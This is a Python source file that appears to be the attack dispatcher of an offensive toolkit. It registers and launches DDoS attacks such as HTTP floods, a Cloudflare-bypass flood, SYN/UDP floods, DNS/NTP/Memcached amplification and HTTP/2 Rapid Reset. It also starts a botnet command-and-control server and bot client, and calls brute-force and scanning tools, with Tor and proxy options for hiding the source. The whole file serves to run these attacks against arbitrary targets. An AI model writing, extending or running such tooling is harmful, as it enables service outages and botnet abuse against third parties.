import threading
import asyncio
from typing import Dict, Type, Optional, Any

from src.utils import add_system_log, check_root_privileges
from src.security import increment_thread_counter
from src.attacks import * # Keep legacy imports for safety
from src.attacks.base import AttackBase
from src.attacks.layer7 import (
    HTTPFloodAttack, StealthHTTPFloodAttack, AsyncHTTPFloodAttack, 
    SlowlorisAttack, CloudflareBypassFloodAttack, RudyAttack, HoicAttack,
    ApacheKillerAttack, NginxRangeDosAttack, Http2RapidResetAttack,
    SlowPostAttack, AdaptiveFloodAttack, MixedFloodAttack
)
from src.attacks.l4 import (
    SynFloodAttack, UdpFloodAttack, IcmpFloodAttack, 
    PingOfDeathAttack, QuicFloodAttack, IcmpHybridAttack
)
from src.attacks.amplification import (
    NtpAmplificationAttack, MemcachedAmplificationAttack,
    SsdpAmplificationAttack, DnsAmplificationAttack
)
from src.utils.targets import target_mgmt
from src.core.c2 import BotnetC2
from src.core.menu import Menu
from src.core.attack_manager import attack_manager
from src.core.events import event_bus, Event, EventType


class AttackRegistry:
    """Registry of attack classes mapped to Menu choices"""
    
    _registry: Dict[str, Type[AttackBase]] = {
        "1": StealthHTTPFloodAttack,
        "2": AsyncHTTPFloodAttack,
        "3": SynFloodAttack,
        "4": UdpFloodAttack,
        "5": SlowlorisAttack,
        "6": NtpAmplificationAttack,
        "8": CloudflareBypassFloodAttack,
        "9": MemcachedAmplificationAttack,
        "10": SsdpAmplificationAttack,
        "11": DnsAmplificationAttack,
        "12": RudyAttack,
        "13": HoicAttack,
        "14": Http2RapidResetAttack,
        "15": ApacheKillerAttack,
        "16": NginxRangeDosAttack,
        "19": IcmpHybridAttack,
        "22": AdaptiveFloodAttack,
        "33": MixedFloodAttack,
        "34": SlowPostAttack,
        "35": QuicFloodAttack
    }

    @classmethod
    def get_attack_class(cls, choice: str) -> Optional[Type[AttackBase]]:
        return cls._registry.get(choice)


class AttackDispatcher:
    """Handles attack execution via AttackManager and AttackRegistry"""

    @staticmethod
    def execute(choice, params, monitor=None):
        """Execute the selected attack or management task"""
        try:
            attack_info = Menu.ATTACKS.get(choice)
            if not attack_info:
                print("Invalid choice!")
                return

            # Management & Non-DDOS Tasks
            if choice == "7": # Botnet C2
                c2_port = params.get("c2_port") or params.get("port") or 6667
                c2 = BotnetC2(port=c2_port)
                threading.Thread(target=c2.start_server, daemon=True).start()
                return c2

            if choice == "0": # Target Management
                target_mgmt()
                return

            if choice == "18": # Bot Client
                from src.bot import FullBot
                c2_host = params.get("c2_host") or params.get("target") or "127.0.0.1"
                c2_port = params.get("c2_port") or params.get("port") or 6667
                bot = FullBot(c2_host, c2_port)
                threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
                return bot

            # Standard IP/DDOS Tools that aren't using AttackBase yet (Scanners, OSINT, etc.)
            non_ddos_tools = {
                "17": lambda: port_scanner(params["target"], params.get("port", "1-1024"), params["threads"], stealth=params.get("stealth_mode", True)),
                "20": lambda: network_scanner(threads=params["threads"], subnet=params.get("subnet")),
                "21": lambda: ip_tracker(params["target"] if "." in params["target"] else None),
                "23": lambda: vulnerability_scout(params["target"]),
                "24": lambda: brute_force_suite(params["target"], params.get("service", "ssh")),
                "25": lambda: domain_osint(params["target"]),
                "26": proxy_autopilot,
                "27": wifi_ghost,
                "28": lambda: packet_insight(duration=params["duration"]),
                "29": payload_lab,
                "30": identity_cloak,
                "31": lambda: cve_explorer(params.get("keyword", params["target"])),
                "32": lambda: web_exposure_sniper(params["target"])
            }

            if choice in non_ddos_tools:
                add_system_log(f"[bold cyan]TOOL:[/] Launching {attack_info['name']}")
                return non_ddos_tools[choice]()

            # DDOS Attack Execution (Registry Pattern)
            if attack_info["needs_root"] and not check_root_privileges():
                print(f"{attack_info['name']} requires root privileges!")
                return

            attack_class = AttackRegistry.get_attack_class(choice)
            if not attack_class:
                add_system_log(f"[yellow]WARN:[/] Attack {choice} not yet migrated to class system")
                # Fallback to legacy structure if needed, but we migrated most
                return None

            # Prepare parameters
            target = params["target"]
            port = params.get("port", 80)
            duration = params["duration"]
            threads = params["threads"]
            
            add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")

            # Create session in AttackManager
            session = attack_manager.create_session(
                attack_id=choice,
                attack_name=attack_info["name"],
                target=target,
                config=params
            )

            # Special cases for constructor params
            kwargs = {
                "target": target,
                "port": port,
                "threads": threads,
                "duration": duration
            }
            
            # Map common params to class kwargs
            if "max_requests" in params: kwargs["max_requests"] = params["max_requests"]
            if "proxies" in params: kwargs["proxies"] = params["proxies"]
            if "use_tor" in params: kwargs["use_tor"] = params["use_tor"]
            if "stealth_mode" in params: kwargs["stealth_mode"] = params["stealth_mode"]
            
            # Additional custom params for specific attacks
            if choice == "1": kwargs["use_tls_client"] = True
            
            # Create attack instance
            try:
                attack_inst = attack_class(**kwargs)
            except TypeError as e:
                # Handle cases where some attacks don't take all standard params
                # Filter out irrelevant kwargs
                import inspect
                valid_params = inspect.signature(attack_class.__init__).parameters
                filtered_kwargs = {k: v for k, v in kwargs.items() if k in valid_params}
                attack_inst = attack_class(**filtered_kwargs)

            # Setup monitor for backward compatibility with HUD
            if monitor:
                def update_legacy_monitor(state, metrics):
                    if state == "running":
                        monitor.packets_sent = metrics["packets_sent"]
                        monitor.bytes_sent = metrics["bytes_sent"]
                        monitor.failed = metrics.get("packets_failed", 0)
                attack_inst.on_progress = update_legacy_monitor

            # Start via Manager
            attack_manager.start_session(session.id, attack_inst)
            return attack_inst

        except Exception as e:
            add_system_log(f"[bold red]ERROR:[/] Dispatcher failed for {choice}: {str(e)}")
            import traceback
            traceback.print_exc()
            return None

